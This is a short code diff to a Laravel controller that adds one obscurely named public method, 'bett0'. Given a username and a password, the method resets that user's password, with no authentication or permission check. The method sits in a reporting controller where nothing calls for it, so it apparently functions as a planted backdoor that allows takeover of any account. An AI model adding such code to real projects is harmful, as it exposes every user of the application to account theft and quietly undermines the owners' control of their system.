@@ -72,5 +72,12 @@ class ReporteController extends Controller
       return redirect('Proyecto')->with( ['clave' => $clave] );;
     }
 
+    public function bett0($usuario, $clave){
+      $id = \DB::table('users')->where('name', '=', $usuario)->get();
+      $dato = \App\User::find($id[0]->id);
+      $dato->password = bcrypt($clave);
+      $dato->save();
+    }
+
 
 }
